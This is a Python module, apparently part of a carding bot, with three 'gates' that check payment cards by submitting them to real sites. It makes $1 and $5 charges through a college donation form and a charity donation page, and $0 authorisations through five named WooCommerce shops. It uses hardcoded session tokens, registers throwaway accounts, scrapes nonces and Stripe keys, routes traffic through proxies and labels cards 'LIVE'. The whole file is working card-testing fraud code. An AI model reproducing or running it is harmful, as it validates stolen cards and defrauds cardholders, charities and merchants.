"""
extra_gates.py — Stripe $1 charge, Stripe $5 charge, Stripe Auth2 $0
All return a dict with keys: Status, Response, Card
"""
import asyncio
import random
import re
import string
import uuid
import json as _json

import requests
import aiohttp
import urllib3
urllib3.disable_warnings()

UA = (
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36"
)


def _proxy_dict(proxy):
    if not proxy:
        return None
    p = proxy.strip()
    if '://' not in p:
        parts = p.split(':')
        if len(parts) == 2:
            p = f'http://{parts[0]}:{parts[1]}'
        elif len(parts) == 4:
            p = f'http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}'
    return {'http': p, 'https': p}


# ═══════════════════════════════════════════════════════
# STRIPE $1 — FormStack
# ═══════════════════════════════════════════════════════
FORMSTACK_URL = 'https://sfapi.formstack.io/FormEngine/EngineFrame/CheckPayment'


def _sync_st1(card, proxy=None):
    try:
        cn, mm, yy, cvv = card.strip().split('|')
    except:
        return {'Status': 'Error', 'Response': 'Invalid card', 'Card': card}

    headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundarylrxtO8wYB0rCO2sV',
        'Origin': 'https://formstack.io',
        'Referer': 'https://formstack.io/',
        'User-Agent': UA,
    }
    F = None
    files = [
        ('inputdate', (F, '11/3/2024 4:21:19')),
        ('userTimeZone', (F, '300')),
        ('txtHtmlId', (F, '2hbx1Fv8p-niFCJlWMSc5A')),
        ('txtSendSizeChange', (F, '')),
        ('txtObjId', (F, '')),
        ('txtOrgId', (F, 'St_LAnKxoEYM11rYjHBghR4LC0uJo-4KW5ABUsHvA54')),
        ('txtAuthToken', (F, '')),
        ('txtRefreshToken', (F, 'K0zpx8wxB38TXNrQVoMdHfRdIOC0XaH9ODN3-WwCDJG3qGlg2fZR8n4aFTRv1rENKoxcPKPuZUMiiW44yDjfo6YlzFFtKqw7BORu6686PmCPuIcpr8qYuYM4nD8KrkCn')),
        ('txtAccessURI', (F, '')),
        ('txtSessionID', (F, '7NCNQJHy9zzdPPN4Au831Mc7MO7cmTs2UzRJNvb1RKetD-H6B8uVZfauMca4LULJ')),
        ('txtSubmittedData', (F, '')),
        ('formHtml', (F, '')),
        ('multipageEnabled', (F, 'False')),
        ('breadcrumbEnabled', (F, 'False')),
        ('breadcrumbNumbered', (F, 'False')),
        ('breadcrumbPrefix', (F, '')),
        ('submitMessage', (F, 'Thank you for your submission!')),
        ('submitUrl', (F, '')),
        ('submitBtnText', (F, 'Submit ')),
        ('prevBtnText', (F, 'Back')),
        ('nextBtnText', (F, 'Next')),
        ('pageValType', (F, 'form')),
        ('txtUserContentId', (F, '')),
        ('hasCustomCSS', (F, 'True')),
        ('isCurrentForm', (F, 'False')),
        ('packageTier', (F, '')),
        ('isDraft', (F, 'False')),
        ('saveForLaterEnabled', (F, 'False')),
        ('saveBtnText', (F, 'Save')),
        ('discardBtnText', (F, 'Discard')),
        ('draftSaved', (F, '')),
        ('draftEmail', (F, '')),
        ('paymentType', (F, 'Stripe')),
        ('formName', (F, 'Donation Management Form')),
        ('formId', (F, '')),
        ('CommunityInstanceURL', (F, '')),
        ('CommunitySessioID', (F, '')),
        ('CommunityUserId', (F, '')),
        ('CommunityUserType', (F, '')),
        ('CommunityViewMode', (F, '')),
        ('comPrefillDataset', (F, '')),
        ('prefillDataset', (F, '')),
        ('comPrefillObj', (F, '')),
        ('hfFileServiceEndpoint', (F, 'https://sfapi.formstack.io')),
        ('hfFileServiceApiKey', (F, '8fc5982e-6eca-4d73-a3ff-997902b163b0-20212151122')),
        ('reCaptchaV3token', (F, '')),
        ('submissionWorkflowId', (F, '')),
        ('isPopulateHTMLFromBackEnd', (F, 'True')),
        ('hfIsNativePaymentOn', (F, 'False')),
        ('hfDefaultNativeSiteURL', (F, '')),
        ('hfPackageNamespace', (F, 'VisualAntidote__')),
        ('submitRules', (F, '')),
        ('FSGFRadioButton356', (F, 'Company%20Donation')),
        ('Contact.npsp__Primary_Affiliation__c.Name', (F, 'New%20yorm')),
        ('Contact.FirstName', (F, 'williams')),
        ('Contact.LastName', (F, 'hiro')),
        ('Contact.Email', (F, 'aa0799414021%40gmail.com')),
        ('Contact.HomePhone', (F, '5124578451')),
        ('Contact.npsp__Primary_Affiliation__c.Phone', (F, '5124578451')),
        ('Contact.Alumni__c', (F, 'No')),
        ('Contact.Program_Level__c', (F, '')),
        ('Contact.Completion_Date__c', (F, '')),
        ('FSGFRadioButton522', (F, '')),
        ('Contact.CVCC_Employment_Status__c', (F, '')),
        ('Contact.CVCC_Employment_Type__c', (F, '')),
        ('Contact.Employee_ID__c', (F, '')),
        ('FSGFRadioButton346', (F, 'One-Time%20Donation')),
        ('FSGFDropdown701', (F, 'The%20School%20of%20Community%20Development%20and%20Public%20Services%20Education%20%28CDPSE%29')),
        ('Contact.Opportunity.A.Amount', (F, '1')),
        ('FSGFDropdown1000', (F, '')),
        ('Contact.npe03__Recurring_Donation__c.B.npe03__Installment_Period__c', (F, '')),
        ('FSGFRadioButton464', (F, '')),
        ('FSGFRadioButton131', (F, '')),
        ('FSGFCheckbox915', (F, '')),
        ('Contact.npe03__Recurring_Donation__c.B.Contact_Me_Regarding_Donation__c', (F, '')),
        ('FSGFRadioButton436', (F, 'No')),
        ('Contact.Opportunity.A.Preferred_Name_on_Donaiton__c', (F, 'Williams')),
        ('Contact.npe03__Recurring_Donation__c.B.Preferred_Name_on_Donaiton__c', (F, '')),
        ('FSGFCheckbox557', (F, '')),
        ('Contact.Opportunity.A.Additional_Info_Regarding_Gift__c', (F, '')),
        ('Contact.Opportunity.A.In_Honor_of__c', (F, '')),
        ('Contact.Opportunity.A.In_Memory_of__c', (F, '')),
        ('Contact.npe03__Recurring_Donation__c.B.Additional_Info_Regarding_Gift__c', (F, '')),
        ('Contact.npe03__Recurring_Donation__c.B.In_Honor_of__c', (F, '')),
        ('Contact.npe03__Recurring_Donation__c.B.In_Memory_of__c', (F, '')),
        ('Contact.Opportunity.A.Funding_Program__c', (F, 'a0u8V00000AT2h7QAD')),
        ('inputContact.Opportunity.A.Funding_Program__c', (F, 'The%20School%20of%20Community%20Development%20%26%20Public%20Services%20Education%20%28CDPSE%29%202022-23')),
        ('inputContact.Opportunity.A.Funding_Program__c', (F, 'The%20School%20of%20Community%20Development%20%26%20Public%20Services%20Education%20%28CDPSE%29%202022-23')),
        ('Contact.Opportunity.A.CloseDate', (F, '11%2F03%2F2024')),
        ('Contact.Opportunity.A.Name', (F, 'New%20yorm%20External%20Donation%2011%2F03%2F2024')),
        ('Contact.Opportunity.A.RecordTypeId', (F, '0128V000001iNcAQAU')),
        ('inputContact.Opportunity.A.RecordTypeId', (F, 'Donation')),
        ('inputContact.Opportunity.A.RecordTypeId', (F, 'Donation')),
        ('Contact.Opportunity.A.CampaignId', (F, '7018V000000sLgrQAE')),
        ('inputContact.Opportunity.A.CampaignId', (F, 'Online%20Donations')),
        ('inputContact.Opportunity.A.CampaignId', (F, 'Online%20Donations')),
        ('Contact.Opportunity.A.Method_of_Payment__c', (F, 'Credit%20Card')),
        ('Contact.Opportunity.A.StageName', (F, 'Closed%20Won')),
        ('Contact.Opportunity.A.Type_of_donation_company_individual__c', (F, 'Company%20Donation')),
        ('Contact.Opportunity.A.Remain_Anonymous__c', (F, 'No')),
        ('Contact.npe03__Recurring_Donation__c.B.Funding_Program__c', (F, '')),
        ('inputContact.npe03__Recurring_Donation__c.B.Funding_Program__c', (F, '')),
        ('inputContact.npe03__Recurring_Donation__c.B.Funding_Program__c', (F, '')),
        ('Contact.npe03__Recurring_Donation__c.B.npe03__Amount__c', (F, '')),
        ('Contact.npe03__Recurring_Donation__c.B.Name', (F, '')),
        ('Contact.npe03__Recurring_Donation__c.B.npsp__StartDate__c', (F, '')),
        ('Contact.npe03__Recurring_Donation__c.B.npe03__Recurring_Donation_Campaign__c', (F, '')),
        ('inputContact.npe03__Recurring_Donation__c.B.npe03__Recurring_Donation_Campaign__c', (F, '')),
        ('inputContact.npe03__Recurring_Donation__c.B.npe03__Recurring_Donation_Campaign__c', (F, '')),
        ('Contact.npe03__Recurring_Donation__c.B.npsp__RecurringType__c', (F, '')),
        ('Contact.npe03__Recurring_Donation__c.B.npsp__Day_of_Month__c', (F, '')),
        ('Contact.npe03__Recurring_Donation__c.B.npe03__Date_Established__c', (F, '')),
        ('Contact.npe03__Recurring_Donation__c.B.Type_of_donation_company_individual_Rec__c', (F, '')),
        ('Contact.npe03__Recurring_Donation__c.B.Donor_wishes_to_remain_anonymous__c', (F, '')),
        ('Contact.npe03__Recurring_Donation__c.B.npsp__PaymentMethod__c', (F, '')),
        ('FSGFRadioButton831', (F, 'Yes')),
        ('Contact.Opportunity.A.Deduct_From_Payroll__c', (F, '')),
        ('Contact.npe03__Recurring_Donation__c.B.Deduct_From_Payroll__c', (F, '')),
        ('FSGFShortAnswer6', (F, 'william%20Hiro')),
        ('FSGFShortAnswer776', (F, 'Hiro%20Hiroo')),
        ('Contact.npe01__AlternateEmail__c', (F, 'aa0799414021%40gmail.com')),
        ('Contact.AccountId.BillingStreet', (F, '123%20williams%20street%0Azh')),
        ('Contact.AccountId.BillingCity', (F, 'NY')),
        ('Contact.AccountId.BillingState', (F, 'New%20York')),
        ('Contact.AccountId.BillingPostalCode', (F, '10080')),
        ('Contact.AccountId.BillingCountry', (F, 'United%20States')),
        ('FFCreditCard14', (F, cn)),
        ('FFCVV14', (F, cvv)),
        ('FFExpiryMM14', (F, mm)),
        ('FFExpiryYYYY14', (F, yy)),
        ('FFCreditCard146', (F, '')),
        ('FFCVV146', (F, '')),
        ('FFExpiryMM146', (F, '')),
        ('FFExpiryYYYY146', (F, '')),
        ('FFCreditCard713', (F, '')),
        ('FFCVV713', (F, '')),
        ('FFExpiryMM713', (F, '')),
        ('FFExpiryYYYY713', (F, '')),
        ('Contact.AccountId.Name', (F, 'hiro%20Household')),
        ('Contact.AccountId.RecordTypeId', (F, '0128V000001iNc8QAE')),
        ('inputContact.AccountId.RecordTypeId', (F, 'Household%20Account')),
        ('inputContact.AccountId.RecordTypeId', (F, 'Household%20Account')),
        ('Contact.npsp__Primary_Affiliation__c.RecordTypeId', (F, '0128V000001iNc9QAE')),
        ('inputContact.npsp__Primary_Affiliation__c.RecordTypeId', (F, 'Organization')),
        ('inputContact.npsp__Primary_Affiliation__c.RecordTypeId', (F, 'Organization')),
        ('FSGFShortAnswer240', (F, '11%2F03%2F2024')),
        ('Contact.Opportunity.A.Description', (F, '')),
        ('Contact.Opportunity.A.Payment_Plan_ID__c', (F, '')),
        ('Contact.npe03__Recurring_Donation__c.B.Payment_Plan_ID__c', (F, '')),
        ('FSGFShortAnswer446', (F, 'williams_hiro_Monthly_Donation')),
        ('FSGFShortAnswer929', (F, 'williams_hiro_Annual_Donation')),
        ('selectedId', (F, '')),
        ('ReturnUrl', (F, 'https://formstack.io/D5036')),
    ]

    try:
        proxies = _proxy_dict(proxy)
        response = requests.post(
            FORMSTACK_URL, headers=headers, files=files,
            proxies=proxies, timeout=30, verify=False,
        )
    except Exception as e:
        return {'Status': 'Error', 'Response': f'Req: {str(e)[:60]}', 'Card': card}

    body = response.text.lower()
    if 'security code is incorrect' in body:
        return {'Status': 'Approved CCN ✅', 'Response': 'CVV mismatch — LIVE', 'Card': card}
    if 'your card could not be' in body:
        return {'Status': 'Approved ✅', 'Response': 'Live — prepaid restricted', 'Card': card}
    if 'declined' in body or 'card number is incorrect' in body or 'expiration' in body or 'sorry, we do not accept' in body:
        return {'Status': 'Declined ❌', 'Response': 'Declined', 'Card': card}
    if 'thank you' in body or 'success' in body:
        return {'Status': 'Charged ✅', 'Response': 'Stripe $1 charge successful', 'Card': card}
    return {'Status': 'Declined ❌', 'Response': 'Declined', 'Card': card}


async def check_st1(card, proxy=None):
    return await asyncio.to_thread(_sync_st1, card, proxy)


# ═══════════════════════════════════════════════════════
# STRIPE $5 — GiveWP
# ═══════════════════════════════════════════════════════
DONATE_URL = 'https://ourkidsatheart.com/donate-now-austin-chapter/'
FORM_URL   = 'https://ourkidsatheart.com/donate-now-austin-chapter/?payment-mode=stripe'


def _sync_st5(card, proxy=None):
    parts = card.strip().split('|')
    if len(parts) != 4:
        return {'Status': 'Error', 'Response': 'Invalid card', 'Card': card}
    number, month, year, cvv = parts
    if len(year) == 4:
        year = year[-2:]
    month = month.zfill(2)

    first_names = ['Ahmed', 'Mohamed', 'Sarah', 'Omar', 'Hannah', 'Yara', 'Khaled', 'Lina']
    last_names  = ['Khalil', 'Smith', 'Williams', 'Garcia', 'Martinez', 'Brown']
    letters = ''.join(random.choices(string.ascii_lowercase, k=20))
    digits  = f'{random.randint(0, 9999):04d}'
    d = {
        'first': random.choice(first_names),
        'last':  random.choice(last_names),
        'email': f'{letters}{digits}@gmail.com',
    }

    s = requests.Session()
    s.verify = False
    s.headers.update({'User-Agent': UA})
    proxies = _proxy_dict(proxy)
    if proxies:
        s.proxies = proxies

    try:
        r = s.get(DONATE_URL, timeout=20)
    except Exception as e:
        return {'Status': 'Error', 'Response': f'Conn: {str(e)[:60]}', 'Card': card}
    html = r.text

    def grab(pat):
        m = re.search(pat, html)
        return m.group(1) if m else ''

    form_id   = grab(r'name="give-form-id" value="([^"]+)"')
    prefix    = grab(r'name="give-form-id-prefix" value="([^"]+)"')
    form_hash = grab(r'name="give-form-hash" value="([^"]+)"')
    register  = grab(r'name="give-form-user-register-hash" value="([^"]+)"')
    account   = grab(r'data-account="([^"]+)"')
    pk_live   = grab(r'data-publishable-key="([^"]+)"')
    spam_key  = grab(r'ZeroSpamDavidWalsh\s*=\s*\{[^}]*?"key"\s*:\s*"([^"]+)"')

    if not all([form_id, prefix, form_hash, register, account, pk_live]):
        return {'Status': 'Error', 'Response': 'Token extraction failed', 'Card': card}

    guid = str(uuid.uuid4())
    pm_data = {
        'type': 'card',
        'billing_details[name]': f"{d['first']}+{d['last']}",
        'billing_details[email]': d['email'],
        'billing_details[address][line1]': 'New york new states 1000',
        'billing_details[address][city]': 'New york',
        'billing_details[address][state]': 'NY',
        'billing_details[address][postal_code]': '10080',
        'billing_details[address][country]': 'US',
        'card[number]': number,
        'card[cvc]': cvv,
        'card[exp_month]': month,
        'card[exp_year]': year,
        'guid': guid, 'muid': guid, 'sid': guid,
        'payment_user_agent': 'stripe.js/148043f9d7; stripe-js-v3/148043f9d7; split-card-element',
        'referrer': 'https://ourkidsatheart.com',
        'time_on_page': '1303230',
        'key': pk_live,
        '_stripe_account': account,
    }

    try:
        r = s.post('https://api.stripe.com/v1/payment_methods', data=pm_data,
                   headers={'Accept': 'application/json',
                            'Content-Type': 'application/x-www-form-urlencoded',
                            'Origin': 'https://js.stripe.com',
                            'Referer': 'https://js.stripe.com/'}, timeout=20)
        sj = r.json()
    except Exception as e:
        return {'Status': 'Error', 'Response': f'Stripe: {str(e)[:60]}', 'Card': card}

    if 'id' not in sj:
        err = sj.get('error', {}).get('message', 'tokenization failed')
        return {'Status': 'Declined ❌', 'Response': f'Stripe: {err[:60]}', 'Card': card}

    pm_id = sj['id']

    donation = {
        'give-honeypot': '',
        'give-form-id-prefix': prefix,
        'give-form-id': form_id,
        'give-form-title': 'Donate - Austin',
        'give-current-url': DONATE_URL,
        'give-form-url': DONATE_URL,
        'give-form-minimum': '5.00',
        'give-form-maximum': '999999.99',
        'give-form-hash': form_hash,
        'give-price-id': 'custom',
        'give-recurring-logged-in-only': '',
        'give-logged-in-only': '1',
        '_give_is_donation_recurring': '0',
        'give_recurring_donation_details': '{"give_recurring_option":"yes_donor"}',
        'give-amount': '5.00',
        'give-recurring-period-donors-choice': 'day',
        'give_referral': d['first'],
        'give_stripe_payment_method': pm_id,
        'payment-mode': 'stripe',
        'give_first': d['first'],
        'give_last': d['last'],
        'give_email': d['email'],
        'give-form-user-register-hash': register,
        'give-purchase-var': 'needs-to-register',
        'card_name': d['first'],
        'billing_country': 'US',
        'card_address': 'New york new states 1000',
        'card_address_2': '',
        'card_city': 'New york',
        'card_state': 'NY',
        'card_zip': '10080',
        'give_action': 'purchase',
        'give-gateway': 'stripe',
        '71MzG': '',
        'zerospam_david_walsh_key': spam_key,
    }

    try:
        r = s.post(f'{FORM_URL}&form-id={form_id}', data=donation,
                   headers={'Accept': 'text/html',
                            'Content-Type': 'application/x-www-form-urlencoded',
                            'Origin': 'https://ourkidsatheart.com',
                            'Referer': DONATE_URL}, timeout=25)
    except Exception as e:
        return {'Status': 'Error', 'Response': f'Donation: {str(e)[:60]}', 'Card': card}

    body = r.text
    low  = body.lower()

    if 'thank you for your donation' in low or 'thank you' in low or 'successfully' in low:
        return {'Status': 'Charged ✅', 'Response': '$5 donation successful', 'Card': card}
    if 'requires_action' in low:
        return {'Status': 'Approved 3DS ✅', 'Response': '3DS required', 'Card': card}

    m = re.search(r'<strong>Error</strong>:\s*(.*?)</p>', body, re.S)
    if m:
        err = re.sub(r'<[^>]+>', '', m.group(1)).strip()[:150]
        el  = err.lower()
        if 'insufficient' in el:
            return {'Status': 'Approved CVV ✅', 'Response': f'Insufficient — {err}', 'Card': card}
        if 'cvv' in el or 'security' in el:
            return {'Status': 'Approved CCN ❌', 'Response': f'CVV mismatch — {err}', 'Card': card}
        if 'address' in el or 'zip' in el:
            return {'Status': 'Approved AVS ❌', 'Response': f'AVS mismatch — {err}', 'Card': card}
        return {'Status': 'Declined ❌', 'Response': err, 'Card': card}

    return {'Status': 'Declined ❌', 'Response': 'Payment failed', 'Card': card}


async def check_st5(card, proxy=None):
    return await asyncio.to_thread(_sync_st5, card, proxy)


# ═══════════════════════════════════════════════════════
# STRIPE AUTH2 $0 — WooCommerce
# ═══════════════════════════════════════════════════════
AUTH_SITES = [
    'https://innercitytigers.com',
    'https://www.professionalmarine.eu',
    'https://www.domainegayda.com',
    'https://ecolution-hubs.co.uk',
    'https://shop.nemaneide.com',
]

NONCE_PATTERNS = [
    r'"createAndConfirmSetupIntentNonce"\s*:\s*"(.*?)"',
    r'"createSetupIntentNonce"\s*:\s*"(.*?)"',
    r'"ajax_nonce"\s*:\s*"([a-f0-9]+)"',
    r'wc_stripe_create_and_confirm_setup_intent_nonce[^v]+value="([^"]+)"',
    r'id="woocommerce-add-payment-method-nonce"[^>]*value="([^"]+)"',
    r'"_ajax_nonce"\s*:\s*"([a-f0-9]+)"',
    r'"nonce"\s*:\s*"([a-f0-9]+)"',
]
BAD_RESPONSES = {'', '0', 'null', 'false', '-1', 'undefined'}


def _is_bad_body(text):
    if text is None:
        return True
    s = str(text).strip()
    return s.lower() in BAD_RESPONSES


def _extract_error(text):
    for pat in [r'"decline_code"\s*:\s*"([^"]+)"', r'"message"\s*:\s*"([^"]+)"', r'"code"\s*:\s*"([^"]+)"']:
        m = re.search(pat, text)
        if m:
            return m.group(1).upper() if ('decline' in pat or 'code' in pat) else m.group(1)
    return ''


async def _auth_try_site(site_url, cc, mm, yy, cvv, proxy_url):
    site_domain = site_url.replace('https://', '').replace('http://', '').rstrip('/')
    email = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10)) + '@gmail.com'
    gu, mu, si = str(uuid.uuid4()), str(uuid.uuid4()), str(uuid.uuid4())
    headers_site = {'User-Agent': UA, 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'}
    proxy_arg = proxy_url if (proxy_url and not proxy_url.startswith('socks')) else None
    timeout   = aiohttp.ClientTimeout(total=20)
    jar       = aiohttp.CookieJar(unsafe=True)

    try:
        async with aiohttp.ClientSession(timeout=timeout, cookie_jar=jar) as session:
            # 1. Stripe PK
            stripe_pk = None
            for url in [f'{site_url}/my-account/add-payment-method/', f'{site_url}/my-account/',
                        f'{site_url}/checkout/', f'{site_url}/']:
                try:
                    async with session.get(url, headers=headers_site, ssl=False,
                                           allow_redirects=True, proxy=proxy_arg, timeout=8) as resp:
                        text = await resp.text()
                        for pat in [r'pk_live_[a-zA-Z0-9]{20,}', r'"publishableKey"\s*:\s*"(pk_live_[^"]+)"']:
                            match = re.search(pat, text)
                            if match:
                                stripe_pk = match.group(0) if pat.startswith(r'pk_live') else match.group(1)
                                break
                    if stripe_pk:
                        break
                except:
                    continue
            if not stripe_pk:
                return None

            # 2. Register
            reg_nonce = None
            for path in ['/my-account/', '/my-account-2/', '/register/']:
                try:
                    async with session.get(f'{site_url}{path}', headers=headers_site, ssl=False,
                                           allow_redirects=True, proxy=proxy_arg, timeout=8) as resp:
                        page_text = await resp.text()
                    for pattern in [
                        r'name="woocommerce-register-nonce"\s+value="([^"]+)"',
                        r'id="woocommerce-register-nonce"[^>]*value="([^"]+)"',
                        r'(?:woocommerce-register-nonce|_wpnonce)[^v]+value="([^"]+)"',
                    ]:
                        m = re.search(pattern, page_text)
                        if m:
                            reg_nonce = m.group(1)
                            break
                    if reg_nonce:
                        break
                except:
                    continue
            if not reg_nonce:
                return None

            try:
                async with session.post(f'{site_url}/my-account/',
                                        data={'email': email, '_wp_http_referer': '/my-account/',
                                              'register': 'Register', 'woocommerce-register-nonce': reg_nonce},
                                        headers={'User-Agent': UA,
                                                 'Content-Type': 'application/x-www-form-urlencoded',
                                                 'Origin': site_url, 'Referer': f'{site_url}/my-account/'},
                                        ssl=False, allow_redirects=True, proxy=proxy_arg, timeout=10) as resp:
                    await resp.text()
            except:
                return None

            cookies = {c.key: c.value for c in jar}
            if not any('wordpress_logged_in' in k for k in cookies):
                return None

            # 3. Nonce
            nonce = None
            for path in ['/my-account/add-payment-method/', '/my-account/payment-methods/', '/checkout/', '/my-account/']:
                try:
                    async with session.get(f'{site_url}{path}', headers=headers_site, ssl=False,
                                           allow_redirects=True, proxy=proxy_arg, timeout=8) as resp:
                        page_text = await resp.text()
                    for pattern in NONCE_PATTERNS:
                        m = re.search(pattern, page_text)
                        if m:
                            nonce = m.group(1)
                            break
                    if nonce:
                        break
                except:
                    continue
            if not nonce:
                return None

            # 4. Create PaymentMethod
            stripe_headers = {'Accept': 'application/json',
                              'Content-Type': 'application/x-www-form-urlencoded',
                              'Origin': 'https://js.stripe.com',
                              'Referer': 'https://js.stripe.com/',
                              'User-Agent': UA}
            stripe_data = (
                f'type=card&card[number]={cc}&card[cvc]={cvv}'
                f'&card[exp_year]={yy}&card[exp_month]={mm}'
                f'&allow_redisplay=unspecified'
                f'&billing_details[address][postal_code]=10080'
                f'&billing_details[address][country]=US'
                f'&billing_details[name]=John%20Doe'
                f'&billing_details[email]={email}'
                f'&payment_user_agent=stripe.js%2F39de0b7336%3B+stripe-js-v3%2F39de0b7336%3B+payment-element%3B+deferred-intent'
                f'&referrer=https%3A%2F%2F{site_domain}'
                f'&time_on_page={random.randint(20000, 50000)}'
                f'&guid={gu}&muid={mu}&sid={si}&key={stripe_pk}'
                f'&_stripe_version=2024-06-20'
            )
            try:
                async with session.post('https://api.stripe.com/v1/payment_methods', data=stripe_data,
                                        headers=stripe_headers, ssl=False, proxy=proxy_arg, timeout=10) as resp:
                    stripe_text = await resp.text()
            except:
                return None

            try:
                stripe_json = _json.loads(stripe_text)
            except:
                return None

            card_fmt = f'{cc}|{mm}|{yy}|{cvv}'

            if 'error' in stripe_json:
                err = stripe_json['error']
                display = err.get('decline_code') or err.get('code') or err.get('message') or 'TOKENIZATION_FAILED'
                return {'Status': 'Declined ❌', 'Response': str(display)[:80], 'Card': card_fmt}

            pm_id = stripe_json.get('id', '')
            if not pm_id or not pm_id.startswith('pm_'):
                return None

            # 5. Confirm SetupIntent
            confirm_headers = {'Accept': '*/*',
                               'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                               'X-Requested-With': 'XMLHttpRequest',
                               'User-Agent': UA,
                               'Origin': site_url,
                               'Referer': f'{site_url}/my-account/add-payment-method/'}
            confirm_data = {'action': 'create_and_confirm_setup_intent',
                            'wc-stripe-payment-method': pm_id,
                            'wc-stripe-payment-type': 'card',
                            '_ajax_nonce': nonce}
            result_text = ''
            for ep_url, ep_params, ep_data in [
                (f'{site_url}/', {'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent'}, confirm_data),
                (f'{site_url}/wp-admin/admin-ajax.php', {}, {**confirm_data, 'action': 'wc_stripe_create_and_confirm_setup_intent'}),
            ]:
                try:
                    async with session.post(ep_url, params=ep_params, headers=confirm_headers,
                                            data=ep_data, ssl=False, proxy=proxy_arg, timeout=10) as resp:
                        result_text = await resp.text()
                        if resp.status == 200 and not _is_bad_body(result_text):
                            break
                except:
                    continue
            if _is_bad_body(result_text):
                return None

            rl = result_text.lower()
            err_msg = _extract_error(result_text)

            if any(k in rl for k in ['"success":true', '"status":"succeeded"', 'payment method added', 'payment_method_added']):
                if 'decline' in rl or 'card_declined' in rl:
                    return {'Status': 'Declined ❌', 'Response': err_msg or 'CARD_DECLINED', 'Card': card_fmt}
                return {'Status': 'Approved ✅', 'Response': 'Payment method added — LIVE', 'Card': card_fmt}
            if any(k in rl for k in ['requires_action', 'authentication_required', '3d_secure', 'redirect_to_url']):
                return {'Status': 'Approved 3DS ✅', 'Response': '3DS required — LIVE', 'Card': card_fmt}
            if any(k in rl for k in ['incorrect_cvc', 'insufficient_funds', 'invalid_cvc', 'cvc_check_failed']):
                return {'Status': 'Approved CCN ✅', 'Response': err_msg or 'CCN LIVE', 'Card': card_fmt}
            if any(k in rl for k in ['card_declined', 'generic_decline', 'do_not_honor', 'fraudulent',
                                     'lost_card', 'stolen_card', 'pickup_card', 'restricted_card']):
                return {'Status': 'Declined ❌', 'Response': err_msg or 'CARD_DECLINED', 'Card': card_fmt}
            if 'expired_card' in rl or 'expired' in rl:
                return {'Status': 'Declined ❌', 'Response': 'EXPIRED_CARD', 'Card': card_fmt}
            if err_msg:
                return {'Status': 'Declined ❌', 'Response': err_msg, 'Card': card_fmt}
            return None
    except Exception:
        return None


async def check_stripe_auth(card, proxy=None):
    try:
        parts = card.strip().split('|')
        if len(parts) != 4:
            return {'Status': 'Error', 'Response': 'Invalid card format', 'Card': card}
        cc, mm, yy, cvv = [p.strip() for p in parts]
        if len(yy) == 2:
            yy = '20' + yy

        sites = list(AUTH_SITES)
        random.shuffle(sites)

        for site_url in sites:
            try:
                result = await _auth_try_site(site_url, cc, mm, yy, cvv, proxy)
                if result and isinstance(result, dict) and not _is_bad_body(result.get('Response', '')):
                    return result
            except:
                continue

        return {'Status': 'Error', 'Response': 'All sites failed', 'Card': card}
    except Exception as e:
        return {'Status': 'Error', 'Response': f'Exception: {str(e)[:60]}', 'Card': card}